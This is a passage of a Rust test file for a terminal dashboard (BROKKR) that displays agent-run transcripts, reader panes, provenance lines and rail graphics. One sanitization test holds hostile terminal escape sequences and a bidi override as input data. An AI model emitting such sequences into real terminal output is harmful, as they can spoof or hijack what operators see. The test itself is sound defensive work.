    // with a SELECTED turn opens this same reader, pinned in
    // enter_on_a_transcript_turn_opens_the_whole_turn_in_the_reader.
    // Enter with NO selection still does nothing, so it cannot reopen
    // a stale trail reader.
    let mut participant = at_seats("eff-i");
    apply(&mut participant, &views, Key::Enter);
    apply(&mut participant, &views, Key::Enter);
    assert_eq!(participant.level, Level::Participant);
    apply(&mut participant, &views, Key::Enter);
    assert!(participant.reading.is_none(), "no selection, no reader");
}

/// The PARTICIPANT level with the transcript pane focused, over the
/// given transcript.
fn at_transcript(views: &Views) -> Tui {
    let mut tui = at_seats("eff-i");
    apply(&mut tui, views, Key::Enter);
    apply(&mut tui, views, Key::Enter);
    assert_eq!(tui.level, Level::Participant);
    apply(&mut tui, views, Key::Tab);
    assert_eq!(tui.pane, 1, "the transcript pane");
    tui
}

#[test]
fn the_transcript_cursor_moves_over_turns_and_survives_an_appending_refresh() {
    let mut views = views();
    views.transcript = Some((turns_of(3), false));
    let mut tui = at_transcript(&views);
    assert_eq!(tui.turn, None, "no selection until the cursor moves");

    // j/k and the arrows move over TURNS, wrapping like every list.
    apply(&mut tui, &views, Key::Down);
    assert_eq!(tui.turn.as_deref(), Some("0"));
    apply(&mut tui, &views, Key::Char('j'));
    assert_eq!(tui.turn.as_deref(), Some("1"));
    apply(&mut tui, &views, Key::Char('k'));
    apply(&mut tui, &views, Key::Up);
    assert_eq!(tui.turn.as_deref(), Some("2"), "up from the top wraps");
    apply(&mut tui, &views, Key::Down);
    assert_eq!(tui.turn.as_deref(), Some("0"), "down from the bottom wraps");
    apply(&mut tui, &views, Key::PageDown);
    assert_eq!(tui.turn.as_deref(), Some("2"), "paging saturates");
    apply(&mut tui, &views, Key::PageUp);
    assert_eq!(tui.turn.as_deref(), Some("0"));
    apply(&mut tui, &views, Key::Char('G'));
    assert_eq!(tui.turn.as_deref(), Some("2"));
    apply(&mut tui, &views, Key::Char('g'));
    assert_eq!(tui.turn.as_deref(), Some("0"));
    assert_eq!(tui.offset, 0, "the paragraph offset never moved");

    // Live prose streaming only APPENDS turns, so the index key still
    // names the same turn against a refresh that grew the stream.
    apply(&mut tui, &views, Key::Char('j'));
    let mut grown = views_with("intake");
    grown.transcript = Some((turns_of(5), false));
    let (index, turn) = selected_turn(&tui, &grown).expect("the cursor survives");
    assert_eq!(index, 1);
    assert_eq!(turn.role, "turn 1", "the SAME turn, not a shifted one");

    // A transcript that shrank below the key selects nothing, and the
    // cursor restarts from the top when it moves — like every list.
    let mut shrunk = views_with("intake");
    shrunk.transcript = Some((turns_of(1), false));
    assert!(selected_turn(&tui, &shrunk).is_none());
    apply(&mut tui, &shrunk, Key::Down);
    assert_eq!(tui.turn.as_deref(), Some("0"));
}

#[test]
fn enter_on_a_transcript_turn_opens_the_whole_turn_in_the_reader() {
    let mut views = views();
    views.transcript = Some((
        vec![crate::ui::Turn {
            role: "assistant".to_string(),
            ts: T1.to_string(),
            blocks: vec![
                crate::ui::Block {
                    kind: "text",
                    text: "the whole prose of a long turn".to_string(),
                },
                crate::ui::Block {
                    kind: "tool",
                    text: "Write · specs/interactive-tui/spec.md".to_string(),
                },
            ],
        }],
        false,
    ));
    let mut tui = at_transcript(&views);

    apply(&mut tui, &views, Key::Down);
    apply(&mut tui, &views, Key::Enter);
    let text = tui.reading.clone().expect("Enter opens the reader");
    assert!(text.contains("assistant"), "{text}");
    assert!(text.contains(T1), "{text}");
    assert!(text.contains("the whole prose of a long turn"), "{text}");
    assert!(
        text.contains("⚙ Write · specs/interactive-tui/spec.md"),
        "a tool block is its marker line: {text}"
    );
    assert!(footer_for(&tui, &views).contains("Esc or Enter close"));

    // Esc closes the reader ONLY: the level and the cursor stay put.
    apply(&mut tui, &views, Key::Escape);
    assert!(tui.reading.is_none());
    assert_eq!(tui.level, Level::Participant);
    assert_eq!(tui.turn.as_deref(), Some("0"));

    // The checkpoint pane is still a paragraph, not a door.
    apply(&mut tui, &views, Key::Tab);
    assert_eq!(tui.pane, 0);
    apply(&mut tui, &views, Key::Enter);
    assert!(tui.reading.is_none());
}

/// The operator's ruling (2026-08-30), superseding "no selection still
/// opens nothing": the pane's OWN door. What the reader shows is every
/// turn, composed exactly as the per-turn reader composes one.
#[test]
fn enter_with_no_turn_selected_opens_the_whole_transcript() {
    // Two turns, the second carrying a tool block: order, the ⚙ marker
    // and the separation are all askable of the one string.
    let pair = || {
        vec![
            crate::ui::Turn {
                role: "user".to_string(),
                ts: T0.to_string(),
                blocks: vec![crate::ui::Block {
                    kind: "text",
                    text: "the first prose".to_string(),
                }],
            },
            crate::ui::Turn {
                role: "assistant".to_string(),
                ts: T1.to_string(),
                blocks: vec![
                    crate::ui::Block {
                        kind: "text",
                        text: "the second prose".to_string(),
                    },
                    crate::ui::Block {
                        kind: "tool",
                        text: "Write · specs/interactive-tui/spec.md".to_string(),
                    },
                ],
            },
        ]
    };
    let mut views = views();
    views.transcript = Some((pair(), true));
    let mut tui = at_transcript(&views);
    assert_eq!(tui.turn, None, "the pane opens with no turn selected");

    apply(&mut tui, &views, Key::Enter);
    let text = tui.reading.clone().expect("Enter opens the reader");
    // Stream order, the ⚙ marker per tool block, ONE blank line between
    // turns, and the truncation notice last — asked as the whole string,
    // because the composition IS the contract.
    assert_eq!(
        text,
        format!(
            "user  {T0}\n\
             \n\
             the first prose\n\
             \n\
             assistant  {T1}\n\
             \n\
             the second prose\n\
             ⚙ Write · specs/interactive-tui/spec.md\n\
             \n\
             transcript truncated (size cap) — claude --resume carries the rest"
        ),
        "{text}"
    );
    assert_eq!(
        text.lines().last(),
        Some("transcript truncated (size cap) — claude --resume carries the rest"),
        "the notice is the FINAL line"
    );
    assert_eq!(tui.read_offset, 0, "a fresh door opens at the top");

    // The same door on an untruncated transcript carries no notice.
    apply(&mut tui, &views, Key::Escape);
    let mut whole = views_with("intake");
    whole.transcript = Some((pair(), false));
    apply(&mut tui, &whole, Key::Enter);
    let text = tui.reading.clone().expect("Enter opens the reader");
    assert!(!text.contains("truncated"), "{text}");
    assert!(
        text.ends_with("⚙ Write · specs/interactive-tui/spec.md"),
        "{text}"
    );

    // A transcript of no turns is still a door — the pane HOLDS a
    // transcript, so Enter opens it, empty body and all. A pane holding
    // no transcript at all holds no door.
    apply(&mut tui, &whole, Key::Escape);
    let mut empty = views_with("intake");
    empty.transcript = Some((Vec::new(), false));
    apply(&mut tui, &empty, Key::Enter);
    assert_eq!(tui.reading.as_deref(), Some(""), "no turns, an empty body");
    apply(&mut tui, &empty, Key::Escape);
    let mut capped = views_with("intake");
    capped.transcript = Some((Vec::new(), true));
    apply(&mut tui, &capped, Key::Enter);
    assert_eq!(
        tui.reading.as_deref(),
        Some("transcript truncated (size cap) — claude --resume carries the rest"),
        "no turns but a cap: the notice alone"
    );
    apply(&mut tui, &capped, Key::Escape);
    apply(&mut tui, &views_with("intake"), Key::Enter);
    assert!(tui.reading.is_none(), "no transcript, no reader");

    // The empty body still draws a frame an operator can leave.
    tui.reading = Some(String::new());
    let frame = frame_of(&tui, &empty, 100, 26);
    assert!(frame.contains("Esc closes"), "{frame}");
}

/// The whole-transcript door must stay reachable after a turn has been
/// read: Esc's first rung at the transcript pane clears the selection,
/// and only the next press ascends.
#[test]
fn esc_at_the_transcript_pane_clears_the_turn_before_it_ascends() {
    let mut views = views();
    views.transcript = Some((turns_of(2), false));
    let mut tui = at_transcript(&views);

    apply(&mut tui, &views, Key::Down);
    apply(&mut tui, &views, Key::Enter);
    let one = tui.reading.clone().expect("the turn opens");
    assert!(one.contains("prose of turn 0") && !one.contains("prose of turn 1"));

    // Rung one closes the reader, rung two clears the selection.
    apply(&mut tui, &views, Key::Escape);
    assert!(tui.reading.is_none());
    assert_eq!(tui.turn.as_deref(), Some("0"));
    apply(&mut tui, &views, Key::Escape);
    assert_eq!(tui.turn, None, "the selection is cleared, not the level");
    assert_eq!(tui.level, Level::Participant);

    // …and the whole-transcript door is back, without ever leaving the
    // PARTICIPANT level.
    apply(&mut tui, &views, Key::Enter);
    let all = tui.reading.clone().expect("the whole transcript opens");
    assert!(
        all.contains("prose of turn 0") && all.contains("prose of turn 1"),
        "{all}"
    );

    // Rung three is the ladder it always was.
    apply(&mut tui, &views, Key::Escape);
    apply(&mut tui, &views, Key::Escape);
    assert_eq!(tui.level, Level::Run, "Esc still ascends");

    // The rung belongs to the TRANSCRIPT pane: a stale turn key under
    // the checkpoint pane does not swallow the ascent.
    let mut tui = at_transcript(&views);
    apply(&mut tui, &views, Key::Down);
    apply(&mut tui, &views, Key::Tab);
    assert_eq!(tui.pane, 0, "the checkpoint pane");
    apply(&mut tui, &views, Key::Escape);
    assert_eq!(tui.level, Level::Run);
}

#[test]
fn the_selected_turn_is_marked_and_the_footer_names_the_reader() {
    let mut views = views();
    views.transcript = Some((turns_of(3), false));
    let mut tui = at_transcript(&views);
    apply(&mut tui, &views, Key::Down);
    apply(&mut tui, &views, Key::Char('j'));

    let (buffer, lines) = buffer_and_lines(&tui, &views, 100, 30);
    let frame = lines.join("\n");
    assert!(frame.contains("Enter read turn"), "{frame}");
    let row = lines
        .iter()
        .position(|line| line.contains("turn 1"))
        .expect("the selected turn is drawn");
    assert!(
        modifier_at(&buffer, &lines, row, "turn 1").contains(Modifier::REVERSED),
        "the selected turn wears the selection mark"
    );
    let neighbour = lines
        .iter()
        .position(|line| line.contains("turn 2"))
        .expect("its neighbour is drawn");
    assert!(
        !modifier_at(&buffer, &lines, neighbour, "turn 2").contains(Modifier::REVERSED),
        "and its neighbour does not"
    );
    // The pane follows the cursor: the selected turn's own first line
    // is the scroll, so an earlier turn is what gives way.
    assert!(!frame.contains("prose of turn 0"), "{frame}");
    assert!(frame.contains("prose of turn 1"), "{frame}");
}

#[test]
fn a_hostile_transcript_turn_renders_inert_in_the_reader() {
    let mut views = views();
    views.transcript = Some((
        vec![crate::ui::Turn {
            role: "assis\u{202E}tant\x07".to_string(),
            ts: "\x1b]0;pwn\x07 late".to_string(),
            blocks: vec![crate::ui::Block {
                kind: "text",
                text: "prose\x1b[2Jwith\rescapes".to_string(),
            }],
        }],
        false,
    ));
    let mut tui = at_transcript(&views);
    apply(&mut tui, &views, Key::Down);
    apply(&mut tui, &views, Key::Enter);
    let text = tui.reading.clone().expect("the hostile turn still opens");
    assert!(
        !text.contains('\x1b') && !text.contains('\x07') && !text.contains('\u{202E}'),
        "reading holds sanitized text only: {text:?}"
    );
    let frame = frame_of(&tui, &views, 100, 26);
    assert!(
        !frame.contains('\x1b') && !frame.contains('\x07'),
        "{frame}"
    );
    assert!(frame.contains("pwn"), "stripped, never hidden: {frame}");
}

// ------------------------------------- AC-8/AC-17: provenance in the tui

/// The same journal, with the intake seat agent-resolved and fallen back
/// to its second model — plus the compile-time notice the manifest
/// already carries.
fn adopting_views() -> Views {
    let mut events = journal("intake");
    events[0].payload = json!({
        "feature": "one derivation, three surfaces",
        "manifest": {"agents": {"intake": {"notices": [
            {"message": "optional capability gap: no MCP server github"},
        ]}}},
    });
    events[3].payload = json!({
        "effect_id": "eff-i", "attempt_id": "att1",
        "provenance": [{"member": null, "agent": "intake", "model": "opus",
                        "provider": "claude", "chain_index": 1}],
    });
    Views {
        now: NOW.to_string(),
        runs: fleet(),
        run: Some(brokkr_view::run_view(&events, Some(&state()))),
        transcript: None,
        note: None,
    }
}

/// The run level shows both run-level notices and the per-seat sentence,
/// and it shows the sentence the derivation composed rather than one of
/// its own.
#[test]
fn the_run_level_shows_run_notices_and_per_seat_provenance() {
    let adopting = adopting_views();
    let frame = frame_of(&at_run(), &adopting, 120, 40);
    assert!(frame.contains("note  capability-gap"), "{frame}");
    assert!(frame.contains("note  fallback"), "{frame}");
    assert!(
        frame.contains("intake · selected opus via claude"),
        "{frame}"
    );

    // A run that resolves nothing shows neither, so an inline fleet
    // reads exactly as it did before decision 0016.
    let inline = views();
    let frame = frame_of(&at_run(), &inline, 120, 40);
    assert!(!frame.contains("note  "), "{frame}");
    assert!(!frame.contains(" via "), "{frame}");
}

/// The seat level keeps the selected plan separate from the served
/// model beside the session resume command.
#[test]
fn the_seat_level_names_what_served_the_seat() {
    let adopting = adopting_views();
    let seats = frame_of(&at_seats("eff-i"), &adopting, 120, 40);
    assert!(
        seats.contains("intake · selected opus via claude"),
        "{seats}"
    );

    // Two rungs: the first scopes the seat, the second descends into it.
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &adopting, Key::Enter);
    apply(&mut tui, &adopting, Key::Enter);
    let detail = frame_of(&tui, &adopting, 120, 40);
    assert!(detail.contains("selected by"), "{detail}");
    assert!(
        detail.contains("intake · selected opus via claude"),
        "{detail}"
    );
    assert!(detail.contains("model     —"), "{detail}");

    let inline = views();
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &inline, Key::Enter);
    apply(&mut tui, &inline, Key::Enter);
    let detail = frame_of(&tui, &inline, 120, 40);
    assert!(detail.contains("selected by"), "{detail}");
    assert!(detail.contains(brokkr_view::ABSENT), "{detail}");
}

/// A session id held by a harness that is not claude is named with its
/// holder and never rendered as a `claude --resume` command: codex
/// seats journal their thread ids now, and a thread id is not a claude
/// session. Provenance absent keeps the claude line, since only claude
/// seats predate decision 0016.
#[test]
fn a_session_held_by_another_harness_never_renders_as_a_claude_command() {
    let mut events = journal("intake");
    events[3].payload = json!({
        "effect_id": "eff-i", "attempt_id": "att1",
        "provenance": [{"member": null, "agent": "intake", "model": "sol",
                        "provider": "codex", "chain_index": 0}],
    });
    events[5].payload["checkpoint"]["transcript"] = json!({
        "kind": "codex-thread",
        "locator": "abcd-1234",
        "home": "/home/operator/.codex"
    });
    let views = Views {
        now: NOW.to_string(),
        runs: fleet(),
        run: Some(brokkr_view::run_view(&events, Some(&state()))),
        transcript: None,
        note: None,
    };
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);
    let frame = frame_of(&tui, &views, 120, 40);
    assert!(
        frame.contains("transcript  codex-thread · abcd-1234"),
        "{frame}"
    );
    assert!(!frame.contains("claude --resume"), "{frame}");
    assert!(
        frame.contains("the transcript line above names it"),
        "{frame}"
    );

    assert_eq!(
        super::session_line("abcd"),
        "full session: claude --resume abcd"
    );
}

#[test]
fn zero_width_characters_cannot_overwrite_the_rail() {
    // The panel's residual: combining marks and variation selectors are
    // neither control characters nor bidi marks, so they survive Safe;
    // unicode-width reports 0 for them while the buffer still spends a
    // cell each. A label of N such marks planned one column and
    // overwrote N — erasing the rail, the arrows and a neighbour's
    // state glyph. clamp now bounds on BOTH display width and char
    // count, which holds for every zero-width class rather than an
    // enumerated few.
    let marks = "\u{0301}".repeat(40);
    let clamped = clamp(&marks, 8);
    assert!(
        clamped.chars().count() <= 8,
        "a zero-width label must never spend more cells than its column: {} chars",
        clamped.chars().count()
    );
    let selectors = "\u{FE0F}".repeat(40);
    assert!(clamp(&selectors, 6).chars().count() <= 6);
    // Ordinary text is untouched by the second bound.
    assert_eq!(clamp("intake", 10), "intake");
    assert_eq!(clamp("", 4), "");
}

#[test]
fn an_unlabelled_fork_carries_the_rail_through_its_capsule() {
    // A panel with no step name left its capsule's middle row blank, so
    // the rail stopped for the width of the widest member label and
    // read as broken track rather than as parallelism. A LABELLED fork
    // still parts the rail to make room for its name.
    let mut cells: Cells = vec![vec![Some((" ".to_string(), plain())); 24]; 3];
    let join = Join {
        x0: 2,
        x1: 10,
        rows: vec![0, 2],
        on_rail: false,
        label: None,
    };
    fork(&mut cells, &join, 1);
    let rail: String = cells[1]
        .iter()
        .flatten()
        .map(|(glyph, _)| glyph.as_str())
        .collect();
    // Byte slicing would land inside a box-drawing glyph; count chars.
    let interior: String = rail.chars().skip(3).take(7).collect();
    assert!(
        !interior.contains(' '),
        "the rail must not break across an unlabelled fork: {rail:?}"
    );

    let mut cells: Cells = vec![vec![Some((" ".to_string(), plain())); 24]; 3];
    let named = Join {
        label: Some("positions".to_string()),
        ..join
    };
    fork(&mut cells, &named, 1);
    let rail: String = cells[1]
        .iter()
        .flatten()
        .map(|(glyph, _)| glyph.as_str())
        .collect();
    assert!(
        rail.contains("positions"),
        "a named fork keeps its name: {rail:?}"
    );
}

#[test]
fn the_rail_cursor_starts_on_the_current_phase_and_moving_it_scopes() {
    // Two defects the operator hit together: a graph that opened with
    // nothing selected made `Enter` look like a dead key, and moving
    // the rail cursor left the panes below unscoped — where the console
    // scopes on a click.
    let views = views();
    let mut tui = Tui::new(Some("run-7".to_string()));
    assert!(tui.cursor[0].is_none());
    settle(&mut tui, &views);
    let seeded = tui.cursor[0].clone().expect("the rail cursor is seeded");
    let current = views
        .run
        .as_ref()
        .unwrap()
        .phases
        .iter()
        .find(|phase| phase.current)
        .map(|phase| phase.name.clone());
    assert_eq!(Some(seeded), current, "seeded on the run's current phase");

    // Moving along the rail scopes to whatever it lands on.
    apply(&mut tui, &views, Key::Char('j'));
    let landed = tui.cursor[0].clone().unwrap();
    let scoped = match &tui.scope {
        Some(render::Scope::Phase(name)) => Some(name.clone()),
        _ => None,
    };
    assert_eq!(
        scoped,
        Some(landed),
        "moving the rail cursor scopes the panes"
    );

    // Seeding never overrides a selection the operator already made.
    let chosen = tui.cursor[0].clone();
    settle(&mut tui, &views);
    assert_eq!(tui.cursor[0], chosen);
}

#[test]
fn the_selected_phase_sits_in_a_symmetric_solid_box() {
    // The console draws a ring around the selected phase; the terminal
    // draws a SOLID box that hugs the segment's occupied rows — a
    // symmetric boundary, not two floating uprights running the pane's
    // full height through empty headroom.
    let views = views();
    let mut tui = at_run();
    settle(&mut tui, &views);
    apply(&mut tui, &views, Key::Char('j'));
    let frame = frame_of(&tui, &views, 100, 26);
    for corner in ['╭', '╮', '╰', '╯'] {
        assert!(
            frame.matches(corner).count() == 1,
            "exactly one {corner}: {frame}"
        );
    }
    assert!(!frame.contains('╌'), "no dashed edges left: {frame}");
    assert!(!frame.contains('┆'), "no dashed sides left: {frame}");
    // Symmetric: the corners pair up on their columns and rows.
    let lines: Vec<&str> = frame.lines().collect();
    let find = |glyph: char| -> (usize, usize) {
        lines
            .iter()
            .enumerate()
            .find_map(|(row, line)| {
                line.chars()
                    .position(|c| c == glyph)
                    .map(|column| (row, column))
            })
            .unwrap()
    };
    let (top_l, left) = find('╭');
    let (top_r, right) = find('╮');
    let (bottom_l, left2) = find('╰');
    let (bottom_r, right2) = find('╯');
    assert_eq!(top_l, top_r, "one top edge");
    assert_eq!(bottom_l, bottom_r, "one bottom edge");
    assert_eq!(left, left2, "one left side");
    assert_eq!(right, right2, "one right side");
    assert!(bottom_l > top_l && right > left, "a real rectangle");
    // And solid, drawn: the bottom edge runs corner to corner with no
    // gap in it. The pane's own `Block` borders are `┌ ┐ └ ┘ │ ─`, so
    // the rounded corners belong to the box alone and slicing by them
    // is safe on the whole frame.
    let edge: String = lines[bottom_l]
        .chars()
        .skip(left)
        .take(right - left + 1)
        .collect();
    let solid = format!("╰{}╯", "─".repeat(right - left - 1));
    assert_eq!(edge, solid, "the bottom edge is unbroken: {frame}");
    assert!(
        frame.contains('┼'),
        "and the rail crosses a wall at a junction: {frame}"
    );

    // Nothing selected, nothing boxed.
    let mut bare = at_run();
    bare.cursor[0] = None;
    let frame = frame_of(&bare, &views, 100, 26);
    assert!(!frame.contains('╭'), "no selection, no box: {frame}");
    assert!(!frame.contains('┼'), "no selection, no junctions: {frame}");
    assert!(!frame.contains('╌'), "and the dashed set is gone: {frame}");
    assert!(!frame.contains('┆'), "in both vocabularies: {frame}");
}

#[test]
fn seeding_falls_back_to_the_last_phase_and_an_empty_run_seeds_nothing() {
    // Without a folded status no phase is current, and the last phase
    // entered is still where an operator is looking. A journal with no
    // phases at all seeds nothing, which is what None already says.
    let mut unfolded = views();
    unfolded.run = Some(brokkr_view::run_view(&journal("intake"), None));
    let mut tui = Tui::new(Some("run-7".to_string()));
    settle(&mut tui, &unfolded);
    let last = unfolded
        .run
        .as_ref()
        .unwrap()
        .phases
        .last()
        .map(|phase| phase.name.clone());
    assert_eq!(tui.cursor[0], last, "falls back to the last phase entered");

    let mut empty = views();
    empty.run = Some(brokkr_view::run_view(&[], None));
    let empty = empty;
    let mut tui = Tui::new(Some("run-7".to_string()));
    settle(&mut tui, &empty);
    assert!(tui.cursor[0].is_none(), "no phases, no cursor");

    // And an empty rail clears the scope rather than stranding one.
    let mut tui = at_run();
    tui.scope = Some(render::Scope::Phase("design".to_string()));
    apply(&mut tui, &empty, Key::Char('j'));
    assert!(tui.scope.is_none(), "nothing to select, nothing scoped");
}

#[test]
fn a_pane_too_short_for_the_box_row_draws_no_half_box() {
    // Height 3 has no reserved box row; half a box would be two
    // floating lines, which is exactly what the box replaced.
    let views = views();
    let mut tui = at_run();
    settle(&mut tui, &views);
    let phases = &views.run.as_ref().unwrap().phases;
    let short = plan(
        phases,
        None,
        "running",
        tui.cursor[0].as_deref(),
        None,
        80,
        3,
    );
    assert_eq!(short.box_row, None);
    let frame = text_of(&paint(&short, 0, false));
    assert!(!frame.contains('╭'), "no box row, no box: {frame}");
    // The graph draws no pane border of its own, so a wall or a
    // junction here could only be the box's half-drawn.
    assert!(!frame.contains('│'), "and no floating walls: {frame}");
    assert!(!frame.contains('┼'), "and no orphan junction: {frame}");
}

#[test]
fn the_brand_mark_rides_the_graph_pane_and_pulses_when_the_fleet_forges() {
    // The console's top-left logo, translated: three rail nodes and
    // the wordmark on the graph pane's border, the third node pulsing
    // on the shared live ramp whenever ANY run is live. The corner
    // 'forging' text retired when this landed (operator's ruling):
    // one signal, not two. The wordmark is BROKKR (decision 0019
    // ruling 1); the rail nodes and the pulse are untouched by the
    // rename, and law 4 keeps every other myth word off the screen.
    let mut views = views();
    let mut tui = at_run();
    settle(&mut tui, &views);
    let frame = frame_of(&tui, &views, 100, 26);
    assert!(frame.contains("BROKKR"), "the mark is always worn: {frame}");
    assert!(
        !frame.contains("the_FORGE"),
        "the old wordmark is gone: {frame}"
    );
    assert!(
        !frame.contains("forging"),
        "the corner text retired: {frame}"
    );

    // Live fleet + animation: the third node pulses on the shared ramp.
    tui.animate = true;
    tui.ticks = PULSE_TICKS;
    let frame = frame_of(&tui, &views, 100, 26);
    assert!(
        frame.contains(&format!("∙ ∙ {} BROKKR", LIVE_RAMP[1])),
        "the third rail node breathes: {frame}"
    );
    tui.animate = false;

    // Idle fleet: the mark stands still with the calibrated dot.
    for row in &mut views.runs.runs {
        row.status = Some("completed".to_string());
    }
    tui.ticks = PULSE_TICKS;
    let frame = frame_of(&tui, &views, 100, 26);
    assert!(
        frame.contains("∙ ∙ ⏺ BROKKR"),
        "idle, still, present: {frame}"
    );
}

// ------------------------------------ the selection box meets the rail
//
// The operator's four rulings of 2026-08-30, one test each: a wall
// never stands on an arrowhead, the box breathes evenly around what the
// phase draws, every connector between two phases is the same length,
// and the box's SHAPE is a function of the selected phase's own lanes.
//
// And the ruling of 2026-08-31, which changed the vocabulary and
// nothing else: the box is SOLID, every side gapless corner to corner,
// with `┼` where a wall crosses the rail. The geometry pins below are
// the prior slice's, unamended — only the glyphs they match moved.

/// A rail carrying every shape the box must answer to: a plain phase
/// whose baseline label is wider than its single node (the operator's
/// own `ship ×2`), two more plain phases, and a fork whose lanes the
/// box has to grow to hold — all in ONE plan, so "the box is a function
/// of the selected phase" is asked by moving the cursor and nothing
/// else.
fn box_phases() -> Vec<Phase> {
    vec![
        gphase("intake", 1, false, Vec::new()),
        gphase("ship", 2, false, Vec::new()),
        gphase(
            "design",
            2,
            false,
            vec![
                gcolumn(
                    Some("positions"),
                    vec![
                        gnode("simplicity", "finished", "on-phosphor"),
                        gnode("robustness", "active", "in-active"),
                    ],
                ),
                gcolumn(
                    Some("review"),
                    vec![gnode("only", "finished", "on-phosphor")],
                ),
            ],
        ),
        gphase("verify", 1, true, Vec::new()),
    ]
}

fn box_plan(cursor: &str) -> Plan {
    plan(&box_phases(), None, "running", Some(cursor), None, 100, 12)
}

/// The one shape `box_phases()` cannot isolate: a phase whose columns
/// are single nodes IN SERIES — a sequence, no fork anywhere in it. The
/// `design` phase above mixes a two-lane fork with a single step, so it
/// proves "a fork grows the box" but never "a sequence spans its steps"
/// on its own.
fn seq_phases() -> Vec<Phase> {
    vec![
        gphase("intake", 1, false, Vec::new()),
        gphase(
            "build",
            1,
            false,
            vec![
                gcolumn(
                    Some("compile"),
                    vec![gnode("rustc", "finished", "on-phosphor")],
                ),
                gcolumn(Some("link"), vec![gnode("ld", "finished", "on-phosphor")]),
                gcolumn(Some("strip"), vec![gnode("sym", "active", "in-active")]),
            ],
        ),
        gphase("verify", 1, true, Vec::new()),
    ]
}

fn seq_plan(cursor: &str) -> Plan {
    plan(&seq_phases(), None, "running", Some(cursor), None, 100, 12)
}

/// Every shape the box must answer to, named: a plain phase (`intake`,
/// `verify`), a plain phase whose label is wider than its node
/// (`ship ×2`), a two-lane fork (`design`), and a pure sequence
/// (`build`).
fn box_cases() -> Vec<(&'static str, Plan)> {
    vec![
        ("intake", box_plan("intake")),
        ("ship", box_plan("ship")),
        ("design", box_plan("design")),
        ("verify", box_plan("verify")),
        ("build", seq_plan("build")),
    ]
}

/// The frame as a grid of characters, which is how a box is measured:
/// by the glyphs that reached the cells, not by the geometry that
/// placed them.
fn grid_of(plan: &Plan) -> Vec<Vec<char>> {
    text_of(&paint(plan, 0, false))
        .lines()
        .map(|line| line.chars().collect())
        .collect()
}

/// Where the drawn box's corners landed: `(top, left, bottom, right)`.
fn box_of(grid: &[Vec<char>]) -> (usize, usize, usize, usize) {
    let find = |glyph: char| -> (usize, usize) {
        grid.iter()
            .enumerate()
            .find_map(|(row, line)| {
                line.iter()
                    .position(|cell| *cell == glyph)
                    .map(|column| (row, column))
            })
            .unwrap_or_else(|| panic!("the frame drew a {glyph}"))
    };
    let (top, left) = find('╭');
    let (bottom, right) = find('╯');
    (top, left, bottom, right)
}

#[test]
fn no_wall_of_the_selection_box_stands_on_an_arrowhead() {
    // A `╭` directly above a `ᐳ` reads as arithmetic, not as a
    // boundary. The walls stand clear of every arrowhead the plan
    // placed — and clear of the elision columns, which are not theirs
    // to claim — while the head that lands on the selected phase's own
    // node stays inside the boundary it points into, undisturbed.
    for (phase, plan) in box_cases() {
        let grid = grid_of(&plan);
        let (top, left, bottom, right) = box_of(&grid);
        for column in [left, right] {
            assert!(
                !plan.edges.contains(&column),
                "a wall on an arrowhead's column, selecting {phase}"
            );
            assert_ne!(
                grid[plan.rail_row][column], 'ᐳ',
                "and no arrowhead under a wall, selecting {phase}"
            );
            // Asked of the PLAN, not of the grid: the box paints last,
            // so a node it stood on would already be gone by the time
            // the loop below reads the cell, and the read would pass on
            // the wall the collision left behind. Only the plan can say
            // a wall column was clear — as `plan.edges` does above for
            // the arrowheads, and now for every node of every phase, on
            // the lane rows as much as on the rail.
            assert!(
                plan.segments
                    .iter()
                    .flat_map(|seg| &seg.marks)
                    .all(|mark| mark.x != column || mark.row < top || mark.row > bottom),
                "a wall on a node's column, selecting {phase}"
            );
            for (row, line) in grid.iter().enumerate().take(bottom + 1).skip(top) {
                let cell = line[column];
                // The wall is drawn on EVERY row now, rail row included
                // — so the allowlist is the whole solid set, with no row
                // excused from it.
                assert!(
                    "╭╮╰╯│┼".contains(cell),
                    "the wall's own column carries the wall at row {row}, \
                     selecting {phase}: {cell:?}"
                );
                assert!(
                    !"ᐳ⏺∙·⊙⊗".contains(cell),
                    "and never an arrowhead or a node glyph, selecting {phase}: {cell:?}"
                );
            }
        }
        assert!(
            left >= 1 && right <= plan.width - 2,
            "the elision columns stay the elision marks', selecting {phase}"
        );
        // Where there is rail on both sides, it is still seen to pass
        // THROUGH the boundary rather than stop at it — now by wearing
        // the junction rather than by leaving a hole in the wall.
        let inner = plan.segments.first().map(|seg| &seg.key) != Some(&phase.to_string())
            && plan.segments.last().map(|seg| &seg.key) != Some(&phase.to_string());
        assert!(
            !inner || (grid[plan.rail_row][left] == '┼' && grid[plan.rail_row][right] == '┼'),
            "the rail passes through both walls of {phase}"
        );
    }
}

#[test]
fn the_box_breathes_evenly_around_what_the_phase_draws() {
    // `│verify  │` — flush left, floating right — was the report. The
    // box pads the UNION of the phase's rail extent and its name by the
    // same margin on both sides, so neither can end up flush.
    for phase in ["ship", "design", "verify"] {
        let plan = box_plan(phase);
        let grid = grid_of(&plan);
        let (_, left, _, right) = box_of(&grid);
        let seg = plan
            .segments
            .iter()
            .find(|seg| seg.key == phase)
            .expect("the selected phase is in the window");
        let name_end = seg.name_x + width_of(&seg.name) - 1;
        let drawn = (seg.rail.0.min(seg.name_x), seg.rail.1.max(name_end));
        assert_eq!(
            drawn.0 - left,
            right - drawn.1,
            "even padding either side, selecting {phase}"
        );
        assert!(
            drawn.0 - left > 1,
            "and it breathes rather than touches, selecting {phase}"
        );
        // On the baseline the name is never flush against a wall.
        let baseline = &grid[plan.name_row][left..=right];
        let held: String = baseline.iter().collect();
        assert!(
            held.starts_with("│ ") && held.ends_with(" │"),
            "the name breathes on both sides: {held:?}"
        );
    }

    // The two shapes the rule has to hold across: a phase whose widest
    // element is its NAME, and one whose widest element is its RAIL.
    let plan = box_plan("ship");
    let widths = |key: &str| -> (usize, usize) {
        let seg = plan.segments.iter().find(|seg| seg.key == key).unwrap();
        (width_of(&seg.name), seg.rail.1 - seg.rail.0 + 1)
    };
    let (name, rail) = widths("ship");
    assert!(
        name > rail,
        "the wide-named case is really wide: {name}/{rail}"
    );
    let (name, rail) = widths("design");
    assert!(
        rail > name,
        "and the wide-railed case really is: {name}/{rail}"
    );

    // Exactly even, drawn: the operator's own case, counted in spaces.
    let grid = grid_of(&plan);
    let (_, left, _, right) = box_of(&grid);
    let held: String = grid[plan.name_row][left..=right].iter().collect();
    assert_eq!(held, "│ ship ×2 │", "flush against neither wall");
}

#[test]
